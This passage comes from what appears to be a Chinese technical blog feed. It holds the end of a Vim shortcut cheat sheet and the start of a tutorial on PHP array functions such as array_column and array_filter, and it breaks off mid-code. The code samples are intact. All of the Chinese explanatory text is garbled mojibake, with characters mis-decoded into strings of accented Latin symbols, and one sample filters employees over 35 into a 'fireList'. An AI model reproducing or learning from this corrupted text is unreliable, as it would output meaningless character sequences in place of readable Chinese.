align="center"><code>daw</code></td><td align="center">åˆ é™¤å…‰æ ‡å¤„å­—ç¬¦ï¼ŒåŒ…å«ç©ºç™½å­—ç¬¦</td></tr><tr><td align="center"><code>ciw</code></td><td align="center">åˆ é™¤å…‰æ ‡å¤„å­—ç¬¦ï¼Œå¹¶å¼€å§‹æ’å…¥</td></tr><tr><td align="center"><code>caw</code></td><td align="center">åˆ é™¤å…‰æ ‡å¤„å­—ç¬¦å’Œå…¶åè¾¹ç©ºæ ¼ï¼Œå¹¶å¼€å§‹æ’å…¥</td></tr><tr><td align="center"><code>dG</code></td><td align="center">åˆ é™¤åˆ°é¡µå°¾</td></tr><tr><td align="center"><code>dgg</code></td><td align="center">åˆ é™¤åˆ°é¡µé¦–</td></tr><tr><td align="center"><code>:m,nd</code></td><td align="center">åˆ é™¤m~nè¡Œ</td></tr><tr><td align="center"><code>:m,ny</code></td><td align="center">å¤åˆ¶m~nè¡Œ</td></tr><tr><td align="center"><code>:m,nmt</code></td><td align="center">å‰ªåˆ‡m~nè¡Œå†…å®¹åˆ°tè¡Œ</td></tr><tr><td align="center"><code>:m,ncot</code></td><td align="center">å¤åˆ¶m~nè¡Œå†…å®¹åˆ°tè¡Œ</td></tr><tr><td align="center"><code>N&gt;&gt;</code></td><td align="center">Nè¡Œå³ç¼©è¿›</td></tr><tr><td align="center"><code>N&lt;&lt;</code></td><td align="center">Nè¡Œå·¦ç¼©è¿›</td></tr><tr><td align="center"><code>==</code></td><td align="center">å¯¹é½å½“å‰è¡Œ</td></tr><tr><td align="center"><code>gg=G</code></td><td align="center">å¯¹é½å…¨æ–‡</td></tr><tr><td align="center"><code>ggvG</code></td><td align="center">å…¨é€‰</td></tr><tr><td align="center"><code>ctrl-f/b</code></td><td align="center">ä¸Šç¿»é¡µ/ä¸‹ç¿»é¡µ</td></tr><tr><td align="center"><code>ctrl-u/d</code></td><td align="center">ä¸Šç¿»åŠé¡µ/ä¸‹ç¿»åŠé¡µ</td></tr><tr><td align="center"><code>ctrl-g</code></td><td align="center">é¡µé¢åº•éƒ¨æ˜¾ç¤ºè¡Œæ•°ç­‰æ–‡ä»¶ç›¸å…³æƒ…å†µ</td></tr><tr><td align="center">``</td><td align="center">åœ¨æœ€è¿‘åœç•™çš„ä¸¤ç‚¹é—´è·³è½¬</td></tr><tr><td align="center">`.</td><td align="center">è·³è½¬åˆ°ä¸Šæ¬¡ä¿®æ”¹ä½ç½®</td></tr><tr><td align="center"><code>ctrl-i/o</code></td><td align="center">è·³è½¬åˆ°å°†æ¥/è¿‡å»åœç•™çš„ä½ç½®</td></tr><tr><td align="center"><code>:args</code></td><td align="center">æ˜¾ç¤ºå½“å‰æ­£åœ¨ç¼–è¾‘çš„æ–‡ä»¶</td></tr><tr><td align="center"><code>.</code></td><td align="center">é‡å¤ä¸Šæ¬¡æ“ä½œ</td></tr><tr><td align="center">æ‰“å¼€æœ€è¿‘ä¸€æ¬¡æ‰“å¼€çš„æ–‡ä»¶</td><td align="center"><code>!vim</code></td></tr><tr><td align="center">æŸ¥çœ‹æœ€è¿‘æ‰“å¼€è¿‡çš„æ–‡ä»¶</td><td align="center">åœ¨ä¸€ä¸ªæ‰“å¼€çš„æ–‡ä»¶ä¸­è¾“å…¥<code>:ol</code>ï¼ˆolæ˜¯oldfilesçš„ç¼©å†™ï¼‰ï¼Œè‹¥è¯¥å‘½ä»¤æ— æ•ˆï¼Œå¯ä»¥å°è¯•<code>:bro ol</code>ï¼ˆ:browse oldfilesçš„ç¼©å†™ï¼‰</td></tr><tr><td align="center">ç›´æ¥æ‰“å¼€æœ€è¿‘çš„ä»»ä½•æ–‡ä»¶</td><td align="center">åœ¨ç”¨<code>:ol</code>æŸ¥çœ‹å†å²æ—¶ï¼Œä½¿ç”¨<code>:e #&lt;æ•°å­—</code>æ¥ç›´æ¥æ‰“å¼€å¯¹åº”æ–‡ä»¶</td></tr><tr><td align="center"><code>:sp</code></td><td align="center">æ°´å¹³åˆ†éš”å½“å‰çª—æ ¼</td></tr><tr><td align="center"><code>:vs</code></td><td align="center">å‚ç›´åˆ†éš”å½“å‰çª—æ ¼</td></tr><tr><td align="center"><code>Ctrl+w,Ctrl+w</code></td><td align="center">åˆ‡æ¢åˆ°ä¸‹ä¸€ä¸ªçª—æ ¼ï¼ˆé¡ºæ—¶é’ˆï¼‰</td></tr><tr><td align="center"><code>Ctrl+w,Ctrl+j</code></td><td align="center">åˆ‡æ¢åˆ°ä¸‹é¢çš„çª—æ ¼</td></tr><tr><td align="center"><code>Ctrl+w,Ctrl+k</code></td><td align="center">åˆ‡æ¢åˆ°ä¸Šé¢çš„çª—æ ¼</td></tr><tr><td align="center"><code>Ctrl+w,Ctrl+h</code></td><td align="center">åˆ‡æ¢åˆ°å·¦è¾¹çš„çª—æ ¼</td></tr><tr><td align="center"><code>Ctrl+w,Ctrl+l</code></td><td align="center">åˆ‡æ¢åˆ°å³è¾¹çš„çª—æ ¼</td></tr></tbody></table><h1 id="äºŒã€æœç´¢"><a href="#äºŒã€æœç´¢" class="headerlink" title="äºŒã€æœç´¢"></a>äºŒã€æœç´¢</h1><table><thead><tr><th align="center">å¿«æ·é”®</th><th align="center">è¯´æ˜</th></tr></thead><tbody><tr><td align="center"><code>*</code></td><td align="center">åœ¨æ–‡æœ¬ä¸­æŸ¥æ‰¾å½“å‰å…‰æ ‡æ‰€åœ¨å¤„å­—ç¬¦ï¼ˆå‘ä¸‹æŸ¥æ‰¾ï¼‰</td></tr><tr><td align="center"><code>#</code></td><td align="center">ï¼ˆå‘ä¸ŠæŸ¥æ‰¾ï¼‰</td></tr><tr><td align="center"><code>?</code></td><td align="center">å‘ä¸Šæœç´¢</td></tr><tr><td align="center"><code>/</code></td><td align="center">å‘ä¸‹æœç´¢ <code>/was$</code>(åªåŒ¹é…ä½äºè¡Œæœ«çš„was);<code>/^was</code>(åªåŒ¹é…ä½äºè¡Œé¦–çš„was)</td></tr><tr><td align="center"><code>v</code></td><td align="center">å­—ç¬¦é€‰æ‹©</td></tr><tr><td align="center"><code>V</code></td><td align="center">è¡Œé€‰æ‹©</td></tr><tr><td align="center"><code>ctrl-v</code></td><td align="center">å—é€‰æ‹©ï¼ˆé€‰æ‹©åoå¯åœ¨é€‰æ‹©åŒºåŸŸä¸¤ç«¯è·³è½¬ï¼‰</td></tr><tr><td align="center"><code>:set ignorecase</code></td><td align="center">å¿½ç•¥å¤§å°å†™æœç´¢</td></tr><tr><td align="center"><code>:set noignorecase</code></td><td align="center">åŒºåˆ†å¤§å°å†™æœç´¢</td></tr><tr><td align="center"><code>:set hlsearch</code></td><td align="center">é«˜äº®æœç´¢ç»“æœ</td></tr><tr><td align="center"><code>:set nohlsearch</code></td><td align="center">å…³é—­é«˜äº®</td></tr><tr><td align="center"><code>.</code></td><td align="center">åŒ¹é…ä»»æ„å•å­—ç¬¦</td></tr><tr><td align="center"><code>\</code></td><td align="center"></td></tr></tbody></table><h1 id="ä¸‰ã€æ›¿æ¢"><a href="#ä¸‰ã€æ›¿æ¢" class="headerlink" title="ä¸‰ã€æ›¿æ¢"></a>ä¸‰ã€æ›¿æ¢</h1><table><thead><tr><th align="center">å¿«æ·é”®</th><th align="center">è¯´æ˜</th></tr></thead><tbody><tr><td align="center"><code>:%s/old/new/g</code></td><td align="center">å…¨æ–‡æ›¿æ¢</td></tr><tr><td align="center"><code>:m,ns/old/new/g</code></td><td align="center">m~nè¡Œæ›¿æ¢</td></tr><tr><td align="center"><code>:s/æ­£åˆ™/æ›¿æ¢æ–‡æœ¬/g</code></td><td align="center">æœ¬è¡Œå†…æ›¿æ¢</td></tr><tr><td align="center"><code>&amp;</code></td><td align="center">é‡å¤ä¸Šæ¬¡æ›¿æ¢å‘½ä»¤</td></tr></tbody></table><h1 id="å››ã€æ ‡è®°"><a href="#å››ã€æ ‡è®°" class="headerlink" title="å››ã€æ ‡è®°"></a>å››ã€æ ‡è®°</h1><table><thead><tr><th align="center">å¿«æ·é”®</th><th align="center">è¯´æ˜</th></tr></thead><tbody><tr><td align="center"><code>ma</code></td><td align="center">åœ¨å½“å‰å…‰æ ‡å¤„æ ‡è®°â€œaâ€ï¼Œå¯ç”¨â€œa~zâ€,â€œAï½Zâ€ä½œä¸ºæ ‡è®°å­—æ¯ï¼Œå°å†™ä»…ç”¨äºå½“å‰ç¼“å†²åŒºï¼Œå¤§å†™å¯è·¨è¶Šä¸åŒçš„ç¼“å†²</td></tr><tr><td align="center"><code>&#39;a</code></td><td align="center">å•å¼•å·+æ ‡è®°ï¼Œå¯ç§»åŠ¨åˆ°æŒ‡å®šæ ‡è®°è¡Œçš„é¦–ä¸ªéç©ºå­—ç¬¦</td></tr><tr><td align="center">`a</td><td align="center">åå¼•å·+æ ‡è®°ï¼Œå¯ç§»åŠ¨åˆ°æ ‡è®°æ—¶çš„å…‰æ ‡ä½ç½®</td></tr><tr><td align="center"><code>:marks</code></td><td align="center">æ˜¾ç¤ºæ‰€æœ‰çš„æ ‡è®°</td></tr><tr><td align="center"><code>:delmarks a b c</code></td><td align="center">åˆ é™¤a,b,cæ ‡è®°</td></tr><tr><td align="center"><code>:delmarks!</code></td><td align="center">åˆ é™¤æ‰€æœ‰æ ‡è®°</td></tr><tr><td align="center">ä½¿ç”¨æ ‡è®°å¿«é€Ÿåˆ é™¤æ–‡æœ¬è¡Œï¼š<code>d&#39;a</code></td><td align="center">å¤åˆ¶è¡Œï¼š<code>y&#39;a</code></td></tr></tbody></table><p>ç³»ç»Ÿå†…ç½®çš„ç‰¹æ®Šæ ‡è®°å¦‚ä¸‹ï¼š</p><ul><li><code>.</code> æœ€è¿‘ç¼–è¾‘ä½ç½®</li><li><code>0ï½9</code> æœ€è¿‘ä½¿ç”¨çš„æ–‡ä»¶ </li><li><code>^</code>æœ€è¿‘æ’å…¥çš„ä½ç½®</li><li><code>&#39;</code> ä¸Šæ¬¡è·³è½¬å‰çš„ä½ç½®</li><li><code>&quot;</code> ä¸Šæ¬¡é€€å‡ºæ–‡ä»¶å‰çš„ä½ç½®</li><li><code>[</code> ä¸Šæ¬¡ä¿®æ”¹å¼€å§‹å¤„</li><li><code>]</code> ä¸Šæ¬¡ä¿®æ”¹ç»“æŸå¤„</li></ul><h1 id="äº”ã€æŠ˜å ä¸å±•å¼€"><a href="#äº”ã€æŠ˜å ä¸å±•å¼€" class="headerlink" title="äº”ã€æŠ˜å ä¸å±•å¼€"></a>äº”ã€æŠ˜å ä¸å±•å¼€</h1><table><thead><tr><th align="center">å¿«æ·é”®</th><th align="center">è¯´æ˜</th></tr></thead><tbody><tr><td align="center"><code>zc</code></td><td align="center">æŠ˜å ä»£ç (close)</td></tr><tr><td align="center"><code>zo</code></td><td align="center">å±•å¼€ä»£ç (open)</td></tr><tr><td align="center"><code>zm</code></td><td align="center">æŠ˜å å…¨éƒ¨</td></tr><tr><td align="center"><code>zr</code></td><td align="center">å±•å¼€å…¨éƒ¨</td></tr><tr><td align="center"><code>zj</code></td><td align="center">ä¸‹ä¸€ä¸ªæŠ˜å </td></tr><tr><td align="center"><code>zk</code></td><td align="center">ä¸Šä¸€ä¸ªæŠ˜å </td></tr><tr><td align="center"><code>zn</code></td><td align="center">ç¦ç”¨æŠ˜å </td></tr><tr><td align="center"><code>zN</code></td><td align="center">å¯ç”¨æŠ˜å </td></tr></tbody></table><h1 id="å…­ã€ä¿å­˜é€€å‡º"><a href="#å…­ã€ä¿å­˜é€€å‡º" class="headerlink" title="å…­ã€ä¿å­˜é€€å‡º"></a>å…­ã€ä¿å­˜é€€å‡º</h1><table><thead><tr><th align="center">å¿«æ·é”®</th><th align="center">è¯´æ˜</th></tr></thead><tbody><tr><td align="center"><code>:w</code></td><td align="center">ä¿å­˜</td></tr><tr><td align="center"><code>:wq</code></td><td align="center">ä¿å­˜é€€å‡º</td></tr><tr><td align="center"><code>ZZ</code></td><td align="center">ä¿å­˜é€€å‡º</td></tr><tr><td align="center"><code>:q!</code></td><td align="center">ä¸ä¿å­˜é€€å‡º</td></tr><tr><td align="center"><code>:wq!</code></td><td align="center">ä¿å­˜é€€å‡ºï¼ˆå¿½ç•¥åªè¯»å±æ€§ï¼Œæ‰€æœ‰è€…åŠrootå¯ç”¨ï¼‰</td></tr></tbody></table><h1 id="ä¸ƒã€ç¤ºä¾‹"><a href="#ä¸ƒã€ç¤ºä¾‹" class="headerlink" title="ä¸ƒã€ç¤ºä¾‹"></a>ä¸ƒã€ç¤ºä¾‹</h1><table><thead><tr><th>æ“ä½œ</th><th>å‘½ä»¤</th></tr></thead><tbody><tr><td>å‘ä¸‹ç§»åŠ¨ 7 è¡Œ</td><td><code>7j</code></td></tr><tr><td>åˆ é™¤ä¸€ä¸ªè¯</td><td><code>dw</code></td></tr><tr><td>åˆ é™¤ä¸€è¡Œ</td><td><code>dd</code></td></tr><tr><td>ä»å…‰æ ‡å¤„åˆ é™¤åˆ°è¡Œå°¾</td><td><code>d$</code></td></tr><tr><td>ä»å…‰æ ‡å¤„åˆ é™¤åˆ°è¡Œé¦–</td><td><code>d0</code></td></tr><tr><td>åˆ é™¤<code>{}</code>ä¸­çš„å†…å®¹</td><td><code>di{</code></td></tr><tr><td>å…‰æ ‡ç§»åŠ¨è‡³ 80 è¡Œ</td><td><code>80G</code></td></tr><tr><td>åœ¨å½“å‰æ–‡ä»¶ä¸­æœç´¢å…‰æ ‡æ‰€åœ¨ä½ç½®</td><td><code>*(#)</code></td></tr><tr><td>åœ¨ 50 è¡Œè‡³ 100 è¡Œé—´æŸ¥æ‰¾å¹¶æ›¿æ¢</td><td><code>:50,100/old/new/g</code></td></tr><tr><td>åœ¨åŒä¸€æ–‡ä»¶ä¸­å¯¹æ¯”ä¸¤ä¸ªä¸åŒçš„å—</td><td><code>:sp(to &#39;split&#39; the view)</code></td></tr><tr><td>è¾“å…¥<code>23+45+119</code>çš„ç»“æœ</td><td><code>Ctrl+r=23+45+119</code></td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> å­¦ä¹ ç¬”è®° </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHPæ•°ç»„å‡½æ•°æ€»ç»“</title>
      <link href="/post/php-array/"/>
      <url>/post/php-array/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/middle/006tNbRwly1g9yly50tbaj31400qo11r.jpg" alt=""></p><a id="more"></a><p>ä½œä¸ºä¸€é—¨ Web å¼€å‘è¯­è¨€ï¼ŒPHP æ— ç–‘æ˜¯æˆåŠŸçš„ï¼š</p><ol><li><p>åªéœ€ç®€å•çš„å­¦ä¹ ä¾¿å¯å¿«é€Ÿä¸Šæ‰‹</p></li><li><p>å†…ç½®å¤§é‡ç³»ç»Ÿå‡½æ•°</p></li><li><p>åŠ¨æ€è§£é‡Šå‹æ›´å¿«æ›´çµæ´»çš„åº”å¯¹ä¸šåŠ¡å¿«é€Ÿè¿­ä»£</p></li><li><p>â€¦â€¦</p><p>PHP çš„æ•°ç»„å‡½æ•°éå¸¸ä¸°å¯Œï¼Œç”¨å¥½è¿™äº›ç³»ç»Ÿå†…ç½®å‡½æ•°ï¼Œè®©ä½ çš„å¼€å‘æ•ˆç‡äº‹åŠåŠŸå€ã€‚</p></li></ol><h2 id="1-array-column"><a href="#1-array-column" class="headerlink" title="1. array_column"></a>1. array_column</h2><h3 id="1-1-æå–æŒ‡å®šåˆ—"><a href="#1-1-æå–æŒ‡å®šåˆ—" class="headerlink" title="1.1 æå–æŒ‡å®šåˆ—"></a>1.1 æå–æŒ‡å®šåˆ—</h3><p>ç›¸ä¿¡å¾ˆå¤š PHPer å¯¹è¿™ä¸ªå‡½æ•°å¹¶ä¸é™Œç”Ÿï¼Œè¿™ä¸ªå‡½æ•°å°±æ˜¯å–æ•°ç»„ä¸­çš„æŸä¸€åˆ—ï¼Œå¦‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$records = <span class="keyword">array</span>(</span><br><span class="line">    <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'id'</span> =&gt; <span class="number">2135</span>,</span><br><span class="line">        <span class="string">'first_name'</span> =&gt; <span class="string">'John'</span>,</span><br><span class="line">        <span class="string">'last_name'</span> =&gt; <span class="string">'Doe'</span>,</span><br><span class="line">    ),</span><br><span class="line">    <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'id'</span> =&gt; <span class="number">3245</span>,</span><br><span class="line">        <span class="string">'first_name'</span> =&gt; <span class="string">'Sally'</span>,</span><br><span class="line">        <span class="string">'last_name'</span> =&gt; <span class="string">'Smith'</span>,</span><br><span class="line">    ),</span><br><span class="line">    <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'id'</span> =&gt; <span class="number">5342</span>,</span><br><span class="line">        <span class="string">'first_name'</span> =&gt; <span class="string">'Jane'</span>,</span><br><span class="line">        <span class="string">'last_name'</span> =&gt; <span class="string">'Jones'</span>,</span><br><span class="line">    ),</span><br><span class="line">    <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'id'</span> =&gt; <span class="number">5623</span>,</span><br><span class="line">        <span class="string">'first_name'</span> =&gt; <span class="string">'Peter'</span>,</span><br><span class="line">        <span class="string">'last_name'</span> =&gt; <span class="string">'Doe'</span>,</span><br><span class="line">    )</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$first_names = array_column($records, <span class="string">'first_name'</span>);</span><br><span class="line">print_r($first_names);</span><br></pre></td></tr></table></figure><p>ç»“æœä¸º</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; John</span><br><span class="line">    [<span class="number">1</span>] =&gt; Sally</span><br><span class="line">    [<span class="number">2</span>] =&gt; Jane</span><br><span class="line">    [<span class="number">3</span>] =&gt; Peter</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h3 id="1-2-æŒ‡å®šåˆ—ä½œé”®å€¼å¯¹"><a href="#1-2-æŒ‡å®šåˆ—ä½œé”®å€¼å¯¹" class="headerlink" title="1.2 æŒ‡å®šåˆ—ä½œé”®å€¼å¯¹"></a>1.2 æŒ‡å®šåˆ—ä½œé”®å€¼å¯¹</h3><p>å¦‚æœæˆ‘ä»¬éœ€è¦æå–<code>last_name</code>ï¼Œå¹¶ç”¨ç›¸åº”çš„<code>id</code>ä½œä¸ºé”®å€¼ï¼Œåº”è¯¥æ€ä¹ˆå®ç°å‘¢ï¼Ÿä½ å¯èƒ½æƒ³åˆ°äº†<code>foreach</code>å¾ªç¯ï¼Œä½†ç”¨<code>array_column()</code>å¯ä»¥ä¸€è¡Œä»£ç æå®šï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$last_names = array_column($records, <span class="string">'last_name'</span>, <span class="string">'id'</span>);</span><br><span class="line">print_r($last_names);</span><br></pre></td></tr></table></figure><p>è¾“å‡ºç»“æœï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">2135</span>] =&gt; Doe</span><br><span class="line">    [<span class="number">3245</span>] =&gt; Smith</span><br><span class="line">    [<span class="number">5342</span>] =&gt; Jones</span><br><span class="line">    [<span class="number">5623</span>] =&gt; Doe</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h3 id="1-3-é‡æ–°ç”Ÿæˆç´¢å¼•å…³ç³»"><a href="#1-3-é‡æ–°ç”Ÿæˆç´¢å¼•å…³ç³»" class="headerlink" title="1.3 é‡æ–°ç”Ÿæˆç´¢å¼•å…³ç³»"></a>1.3 é‡æ–°ç”Ÿæˆç´¢å¼•å…³ç³»</h3><p>æˆ‘ä»¬è¿˜å¯ä»¥å°†æ¯ä¸ªç”¨æˆ·çš„ ID ä½œä¸º<code>$records</code>çš„<code>key</code>é‡æ–°ç”Ÿæˆç´¢å¼•æ•°ç»„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$idRecords = array_column($records, <span class="keyword">null</span>, <span class="string">'id'</span>);</span><br><span class="line">print_r($idRecords);</span><br></pre></td></tr></table></figure><p>ç»“æœä¸ºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">2135</span>] =&gt; <span class="keyword">Array</span></span><br><span class="line">        (</span><br><span class="line">            [id] =&gt; <span class="number">2135</span></span><br><span class="line">            [first_name] =&gt; John</span><br><span class="line">            [last_name] =&gt; Doe</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [<span class="number">3245</span>] =&gt; <span class="keyword">Array</span></span><br><span class="line">        (</span><br><span class="line">            [id] =&gt; <span class="number">3245</span></span><br><span class="line">            [first_name] =&gt; Sally</span><br><span class="line">            [last_name] =&gt; Smith</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [<span class="number">5342</span>] =&gt; <span class="keyword">Array</span></span><br><span class="line">        (</span><br><span class="line">            [id] =&gt; <span class="number">5342</span></span><br><span class="line">            [first_name] =&gt; Jane</span><br><span class="line">            [last_name] =&gt; Jones</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [<span class="number">5623</span>] =&gt; <span class="keyword">Array</span></span><br><span class="line">        (</span><br><span class="line">            [id] =&gt; <span class="number">5623</span></span><br><span class="line">            [first_name] =&gt; Peter</span><br><span class="line">            [last_name] =&gt; Doe</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">)</span><br></pre></td></tr></table></figure><h3 id="1-4-ä»å¯¹è±¡ä¸­è·å–å±æ€§"><a href="#1-4-ä»å¯¹è±¡ä¸­è·å–å±æ€§" class="headerlink" title="1.4 ä»å¯¹è±¡ä¸­è·å–å±æ€§"></a>1.4 ä»å¯¹è±¡ä¸­è·å–å±æ€§</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(string $username)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$users = [</span><br><span class="line">    <span class="keyword">new</span> User(<span class="string">'user 1'</span>),</span><br><span class="line">    <span class="keyword">new</span> User(<span class="string">'user 2'</span>),</span><br><span class="line">    <span class="keyword">new</span> User(<span class="string">'user 3'</span>),</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">print_r(array_column($users, <span class="string">'username'</span>));</span><br></pre></td></tr></table></figure><p>ç»“æœä¸ºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; user <span class="number">1</span></span><br><span class="line">    [<span class="number">1</span>] =&gt; user <span class="number">2</span></span><br><span class="line">    [<span class="number">2</span>] =&gt; user <span class="number">3</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><h2 id="2-array-filter"><a href="#2-array-filter" class="headerlink" title="2. array_filter"></a>2. array_filter</h2><p><code>array_filter()</code>å°†åˆ é™¤ array ä¸­æ‰€æœ‰ç­‰å€¼ä¸º <code>FALSE</code> çš„æ¡ç›®ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(array_filter([<span class="number">0</span>, <span class="number">0.0</span>, <span class="string">'0'</span>, <span class="string">''</span>, <span class="keyword">false</span>, <span class="keyword">null</span>, [], <span class="keyword">true</span>, <span class="number">123</span>, <span class="string">'1'</span>]));</span><br></pre></td></tr></table></figure><p>ç»“æœä¸ºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">3</span>) &#123;</span><br><span class="line">  [<span class="number">7</span>] =&gt;</span><br><span class="line">  bool(<span class="keyword">true</span>)</span><br><span class="line">  [<span class="number">8</span>] =&gt;</span><br><span class="line">  int(<span class="number">123</span>)</span><br><span class="line">  [<span class="number">9</span>] =&gt;</span><br><span class="line">  string(<span class="number">1</span>) <span class="string">"1"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœä½¿ç”¨å›è°ƒå‡½æ•°ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥åšæ›´å¤šçš„äº‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$employees = [</span><br><span class="line">    [</span><br><span class="line">        <span class="string">'name'</span> =&gt; <span class="string">'John'</span>,</span><br><span class="line">        <span class="string">'age'</span> =&gt; <span class="number">45</span>,</span><br><span class="line">        <span class="string">'language'</span> =&gt; <span class="string">'Python'</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">'name'</span> =&gt; <span class="string">'Robbin'</span>,</span><br><span class="line">        <span class="string">'age'</span> =&gt; <span class="number">25</span>,</span><br><span class="line">        <span class="string">'language'</span> =&gt; <span class="string">'Golang'</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">'name'</span> =&gt; <span class="string">'Smith'</span>,</span><br><span class="line">        <span class="string">'age'</span> =&gt; <span class="number">35</span>,</span><br><span class="line">        <span class="string">'language'</span> =&gt; <span class="string">'PHP'</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">'name'</span> =&gt; <span class="string">'Steven'</span>,</span><br><span class="line">        <span class="string">'age'</span> =&gt; <span class="number">29</span>,</span><br><span class="line">        <span class="string">'language'</span> =&gt; <span class="string">'C#'</span></span><br><span class="line">    ]</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">$fireList = array_filter(</span><br><span class="line">    $employees,</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="params">($employee, $key)</span> <span class="title">use</span> <span class="params">(&amp;$employees)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $employee[<span class="string">'age'</span>] &gt; <span class="number">35</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">    